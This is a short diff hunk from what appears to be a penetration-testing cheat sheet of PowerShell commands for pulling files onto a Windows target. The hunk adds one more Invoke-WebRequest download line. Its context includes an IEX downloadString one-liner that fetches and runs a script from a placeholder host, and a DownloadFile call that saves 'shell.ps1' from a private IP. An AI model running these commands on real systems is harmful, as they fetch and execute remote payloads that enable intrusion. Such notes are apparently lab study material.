@@ -94,6 +94,8 @@ powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<>/Invoke-P
 
 Invoke-WebRequest -Uri http://<>/file -OutFile <filename>
 
+powershell.exe iwr -Uri http://<ip>/filename -Outfile filename #I have seen it work ;)
+
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.190:8000/ps.ps1','C:\Users\admin\Desktop\shell.ps1')"
 
 Execute the downloaded file through powershell:
